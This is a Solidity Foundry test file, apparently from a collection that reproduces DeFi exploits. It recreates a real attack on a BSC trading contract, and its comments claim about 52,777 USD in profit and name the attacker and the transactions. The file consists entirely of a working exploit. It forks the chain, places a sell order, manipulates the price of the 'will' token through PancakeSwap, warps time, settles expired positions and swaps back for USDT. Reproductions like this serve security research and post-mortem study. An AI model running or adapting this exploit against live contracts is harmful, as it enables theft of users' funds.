// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Profit : ~52777 USD
// Attacker: https://bscscan.com/address/0xb6911dee6a5b1c65ad1ac11a99aec09c2cf83c0e
// Attack Contract: https://bscscan.com/address/0x63b4de190c35f900bb7adf1a13d66fb1f0d624a1#code
// Actually there are 2 steps
// TX1 : https://app.blocksec.com/explorer/tx/bsc/0xc12ccc3bdaf3f0ec1efa09d089a0c1dbad05519e1eb0fa6475ffcc6317cbde4d
// TX2 :https://app.blocksec.com/explorer/tx/bsc/0xefe58a14fc0022872262678b358aaae64a26fe2389d09093eb14752ea99415e9

// GUY : https://x.com/0xNickLFranklin/status/1806704287252394238

interface Trading{
    function placeSellOrder(uint256 usdtAmount, uint256 margin, uint256 minUsdtReceived) external; 
    function updateExpiredOrders() external; 
    function settleExpiredPositions(uint256 minTokensToReceive) external;
}

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 will = IERC20(0xe38593e7F4f2411E0C0aB74589A7209681ab4B1d);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Trading trading=Trading(0x566777eD780dbbe17c130AE97b9FbC0A3Ab829DF);
    function setUp() external {
        cheats.createSelectFork("bsc", 39979796);
        deal(address(USDT), address(this), 180000 ether);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
        attack();
        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
    }

    function attack() public {
        USDT.approve(address(trading),type(uint256).max);
        trading.placeSellOrder(71000 ether, 0, 0);
        swap_token_to_token(address(USDT), address(will), 88000 ether);
        /////step---2
        vm.warp(block.timestamp + 20);
        trading.updateExpiredOrders();
        trading.settleExpiredPositions(0);
        uint256 willamount=will.balanceOf(address(this));
        swap_token_to_token(address(will), address(USDT), willamount);

    
    }


 function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
}
